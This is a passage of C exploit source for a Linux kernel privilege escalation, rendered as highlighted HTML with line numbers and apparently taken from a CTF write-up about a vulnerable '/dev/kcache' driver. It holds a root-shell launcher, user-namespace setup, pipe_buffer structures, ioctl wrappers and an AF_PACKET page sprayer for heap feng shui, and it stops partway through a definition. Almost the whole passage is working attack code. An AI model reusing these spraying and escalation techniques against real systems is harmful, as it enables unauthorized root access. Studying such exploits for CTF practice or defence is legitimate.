class="line">1089</span><br><span class="line">1090</span><br><span class="line">1091</span><br><span class="line">1092</span><br><span class="line">1093</span><br><span class="line">1094</span><br><span class="line">1095</span><br><span class="line">1096</span><br><span class="line">1097</span><br><span class="line">1098</span><br><span class="line">1099</span><br><span class="line">1100</span><br><span class="line">1101</span><br><span class="line">1102</span><br><span class="line">1103</span><br><span class="line">1104</span><br><span class="line">1105</span><br><span class="line">1106</span><br><span class="line">1107</span><br><span class="line">1108</span><br><span class="line">1109</span><br><span class="line">1110</span><br><span class="line">1111</span><br><span class="line">1112</span><br><span class="line">1113</span><br><span class="line">1114</span><br><span class="line">1115</span><br><span class="line">1116</span><br><span class="line">1117</span><br><span class="line">1118</span><br><span class="line">1119</span><br><span class="line">1120</span><br><span class="line">1121</span><br><span class="line">1122</span><br><span class="line">1123</span><br><span class="line">1124</span><br><span class="line">1125</span><br><span class="line">1126</span><br><span class="line">1127</span><br><span class="line">1128</span><br><span class="line">1129</span><br><span class="line">1130</span><br><span class="line">1131</span><br><span class="line">1132</span><br><span class="line">1133</span><br><span class="line">1134</span><br><span class="line">1135</span><br><span class="line">1136</span><br><span class="line">1137</span><br><span class="line">1138</span><br><span class="line">1139</span><br><span class="line">1140</span><br><span class="line">1141</span><br><span class="line">1142</span><br><span class="line">1143</span><br><span class="line">1144</span><br><span class="line">1145</span><br><span class="line">1146</span><br><span class="line">1147</span><br><span class="line">1148</span><br><span class="line">1149</span><br><span class="line">1150</span><br><span class="line">1151</span><br><span class="line">1152</span><br><span class="line">1153</span><br><span class="line">1154</span><br><span class="line">1155</span><br><span class="line">1156</span><br><span class="line">1157</span><br><span class="line">1158</span><br><span class="line">1159</span><br><span class="line">1160</span><br><span class="line">1161</span><br><span class="line">1162</span><br><span class="line">1163</span><br><span class="line">1164</span><br><span class="line">1165</span><br><span class="line">1166</span><br><span class="line">1167</span><br><span class="line">1168</span><br><span class="line">1169</span><br><span class="line">1170</span><br><span class="line">1171</span><br><span class="line">1172</span><br><span class="line">1173</span><br><span class="line">1174</span><br><span class="line">1175</span><br><span class="line">1176</span><br><span class="line">1177</span><br><span class="line">1178</span><br><span class="line">1179</span><br><span class="line">1180</span><br><span class="line">1181</span><br><span class="line">1182</span><br><span class="line">1183</span><br><span class="line">1184</span><br><span class="line">1185</span><br><span class="line">1186</span><br><span class="line">1187</span><br><span class="line">1188</span><br><span class="line">1189</span><br><span class="line">1190</span><br><span class="line">1191</span><br><span class="line">1192</span><br><span class="line">1193</span><br><span class="line">1194</span><br><span class="line">1195</span><br><span class="line">1196</span><br><span class="line">1197</span><br><span class="line">1198</span><br><span class="line">1199</span><br><span class="line">1200</span><br><span class="line">1201</span><br><span class="line">1202</span><br><span class="line">1203</span><br><span class="line">1204</span><br><span class="line">1205</span><br><span class="line">1206</span><br><span class="line">1207</span><br><span class="line">1208</span><br><span class="line">1209</span><br><span class="line">1210</span><br><span class="line">1211</span><br><span class="line">1212</span><br><span class="line">1213</span><br><span class="line">1214</span><br><span class="line">1215</span><br><span class="line">1216</span><br><span class="line">1217</span><br><span class="line">1218</span><br><span class="line">1219</span><br><span class="line">1220</span><br><span class="line">1221</span><br><span class="line">1222</span><br><span class="line">1223</span><br><span class="line">1224</span><br><span class="line">1225</span><br><span class="line">1226</span><br><span class="line">1227</span><br><span class="line">1228</span><br><span class="line">1229</span><br><span class="line">1230</span><br><span class="line">1231</span><br><span class="line">1232</span><br><span class="line">1233</span><br><span class="line">1234</span><br><span class="line">1235</span><br><span class="line">1236</span><br><span class="line">1237</span><br><span class="line">1238</span><br><span class="line">1239</span><br><span class="line">1240</span><br><span class="line">1241</span><br><span class="line">1242</span><br><span class="line">1243</span><br><span class="line">1244</span><br><span class="line">1245</span><br><span class="line">1246</span><br><span class="line">1247</span><br><span class="line">1248</span><br><span class="line">1249</span><br><span class="line">1250</span><br><span class="line">1251</span><br><span class="line">1252</span><br><span class="line">1253</span><br><span class="line">1254</span><br><span class="line">1255</span><br><span class="line">1256</span><br><span class="line">1257</span><br><span class="line">1258</span><br><span class="line">1259</span><br><span class="line">1260</span><br><span class="line">1261</span><br><span class="line">1262</span><br><span class="line">1263</span><br><span class="line">1264</span><br><span class="line">1265</span><br><span class="line">1266</span><br><span class="line">1267</span><br><span class="line">1268</span><br><span class="line">1269</span><br><span class="line">1270</span><br><span class="line">1271</span><br><span class="line">1272</span><br><span class="line">1273</span><br><span class="line">1274</span><br><span class="line">1275</span><br><span class="line">1276</span><br><span class="line">1277</span><br><span class="line">1278</span><br><span class="line">1279</span><br><span class="line">1280</span><br><span class="line">1281</span><br><span class="line">1282</span><br><span class="line">1283</span><br><span class="line">1284</span><br><span class="line">1285</span><br><span class="line">1286</span><br><span class="line">1287</span><br><span class="line">1288</span><br><span class="line">1289</span><br><span class="line">1290</span><br><span class="line">1291</span><br><span class="line">1292</span><br><span class="line">1293</span><br><span class="line">1294</span><br><span class="line">1295</span><br><span class="line">1296</span><br><span class="line">1297</span><br><span class="line">1298</span><br><span class="line">1299</span><br><span class="line">1300</span><br><span class="line">1301</span><br><span class="line">1302</span><br><span class="line">1303</span><br><span class="line">1304</span><br><span class="line">1305</span><br><span class="line">1306</span><br><span class="line">1307</span><br><span class="line">1308</span><br><span class="line">1309</span><br><span class="line">1310</span><br><span class="line">1311</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * I - fundamental functions</span></span><br><span class="line"><span class="comment"> * e.g. CPU-core binder, user-status saver, etc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>, vmemmap_base = <span class="number">0xffffea0000000000</span>;</span><br><span class="line"><span class="type">size_t</span> init_task, init_nsproxy, init_cred;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">    page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* root checker and shell poper */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* to exit the process normally, instead of segmentation fault */</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* userspace status saver */</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* bind the process to specific core */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_core</span><span class="params">(<span class="type">int</span> core)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @brief create an isolate namespace</span></span><br><span class="line"><span class="comment"> * note that the caller **SHOULD NOT** be used to get the root, but an operator</span></span><br><span class="line"><span class="comment"> * to perform basic exploiting operations in it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">unshare_setup</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line">    <span class="type">int</span> tmp_fd;</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(tmp_fd, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getuid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line"></span><br><span class="line">    tmp_fd = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, getgid());</span><br><span class="line">    write(tmp_fd, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(tmp_fd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* read start from len to offset, write start from offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * -&gt;confirm() verifies that the data in the pipe buffer is there</span></span><br><span class="line"><span class="comment">	 * and that the contents are good. If the pages in the pipe belong</span></span><br><span class="line"><span class="comment">	 * to a file system, we may need to wait for IO completion in this</span></span><br><span class="line"><span class="comment">	 * hook. Returns 0 for good, or a negative error value in case of</span></span><br><span class="line"><span class="comment">	 * error.  If not present all pages are considered good.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> (*confirm)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When the contents of this pipe buffer has been completely</span></span><br><span class="line"><span class="comment">	 * consumed by a reader, -&gt;release() is called.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">void</span> (*release)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Attempt to take ownership of the pipe buffer and its contents.</span></span><br><span class="line"><span class="comment">	 * -&gt;try_steal() returns %true for success, in which case the contents</span></span><br><span class="line"><span class="comment">	 * of the pipe (the buf-&gt;page) is locked and now completely owned by the</span></span><br><span class="line"><span class="comment">	 * caller. The page may then be transferred to a different mapping, the</span></span><br><span class="line"><span class="comment">	 * most often used case is insertion into different file address space</span></span><br><span class="line"><span class="comment">	 * cache.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> (*try_steal)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Get a reference to the pipe buffer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="type">int</span> (*get)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> pipe_buffer *);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * II - interface to interact with /dev/kcache</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_SIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_NUM 0x10</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_ALLOC 0x114</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_APPEND 0x514</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_READ 0x1919</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KCACHE_FREE 0x810</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sz;</span><br><span class="line">    <span class="type">void</span> *buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> dev_fd;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_alloc</span><span class="params">(<span class="type">int</span> index, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">        .sz = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_ALLOC, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_append</span><span class="params">(<span class="type">int</span> index, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">        .sz = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_APPEND, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_read</span><span class="params">(<span class="type">int</span> index, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">        .sz = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_READ, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">kcache_free</span><span class="params">(<span class="type">int</span> index)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kcache_cmd</span> <span class="title">cmd</span> =</span> &#123;</span><br><span class="line">        .idx = index,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ioctl(dev_fd, KCACHE_FREE, &amp;cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * III -  pgv pages sprayer related </span></span><br><span class="line"><span class="comment"> * not that we should create two process:</span></span><br><span class="line"><span class="comment"> * - the parent is the one to send cmd and get root</span></span><br><span class="line"><span class="comment"> * - the child creates an isolate userspace by calling unshare_setup(),</span></span><br><span class="line"><span class="comment"> *      receiving cmd from parent and operates it only</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_PAGE_NUM 1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_VERSION 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PACKET_TX_RING 13</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_block_nr;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> tp_frame_nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">int</span> cmd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> nr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* operations type */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span></span><br><span class="line">    CMD_ALLOC_PAGE,</span><br><span class="line">    CMD_FREE_PAGE,</span><br><span class="line">    CMD_EXIT,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* tpacket version for setsockopt */</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">tpacket_versions</span> &#123;</span></span><br><span class="line">    TPACKET_V1,</span><br><span class="line">    TPACKET_V2,</span><br><span class="line">    TPACKET_V3,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* pipe for cmd communication */</span></span><br><span class="line"><span class="type">int</span> cmd_pipe_req[<span class="number">2</span>], cmd_pipe_reply[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* create a socket and alloc pages, return the socket fd */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">create_socket_and_alloc_pages</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_req</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd, version;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);</span><br><span class="line">    <span class="keyword">if</span> (socket_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n&quot;</span>);</span><br><span class="line">        ret = socket_fd;</span><br><span class="line">        <span class="keyword">goto</span> err_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    version = TPACKET_V1;</span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, </span><br><span class="line">                     &amp;version, <span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_VERSION)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;req, <span class="number">0</span>, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    req.tp_block_size = size;</span><br><span class="line">    req.tp_block_nr = nr;</span><br><span class="line">    req.tp_frame_size = <span class="number">0x1000</span>;</span><br><span class="line">    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;</span><br><span class="line"></span><br><span class="line">    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[x] failed at setsockopt(PACKET_TX_RING)\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> err_setsockopt;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> socket_fd;</span><br><span class="line"></span><br><span class="line">err_setsockopt:</span><br><span class="line">    close(socket_fd);</span><br><span class="line">err_out:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of allocation to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_page</span><span class="params">(<span class="type">int</span> idx, <span class="type">unsigned</span> <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">int</span> nr)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_ALLOC_PAGE,</span><br><span class="line">        .size = size,</span><br><span class="line">        .nr = nr,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv_page_request));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the parent process should call it to send command of freeing to child */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">free_page</span><span class="params">(<span class="type">int</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .cmd = CMD_FREE_PAGE,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    write(cmd_pipe_req[<span class="number">1</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line">    read(cmd_pipe_reply[<span class="number">0</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* the child, handler for commands from the pipe */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">spray_cmd_handler</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv_page_request</span> <span class="title">req</span>;</span></span><br><span class="line">    <span class="type">int</span> socket_fd[PGV_PAGE_NUM];</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* create an isolate namespace*/</span></span><br><span class="line">    unshare_setup();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* handler request */</span></span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        read(cmd_pipe_req[<span class="number">0</span>], &amp;req, <span class="keyword">sizeof</span>(req));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (req.cmd == CMD_ALLOC_PAGE) &#123;</span><br><span class="line">            ret = create_socket_and_alloc_pages(req.size, req.nr);</span><br><span class="line">            socket_fd[req.idx] = ret;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (req.cmd == CMD_FREE_PAGE) &#123;</span><br><span class="line">            ret = close(socket_fd[req.idx]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[x] invalid request: %d\n&quot;</span>, req.cmd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        write(cmd_pipe_reply[<span class="number">1</span>], &amp;ret, <span class="keyword">sizeof</span>(ret));</span><br><span class="line">    &#125; <span class="keyword">while</span> (req.cmd != CMD_EXIT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* init pgv-exploit subsystem :) */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_pgv_system</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* pipe for pgv */</span></span><br><span class="line">    pipe(cmd_pipe_req);</span><br><span class="line">    pipe(cmd_pipe_reply);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* child process for pages spray */</span></span><br><span class="line">    <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">        spray_cmd_handler();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * IV - config for page-level heap spray and heap fengshui</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_SPRAY_NUM 200</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_1PAGE_SPRAY_NUM 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_4PAGES_START_IDX 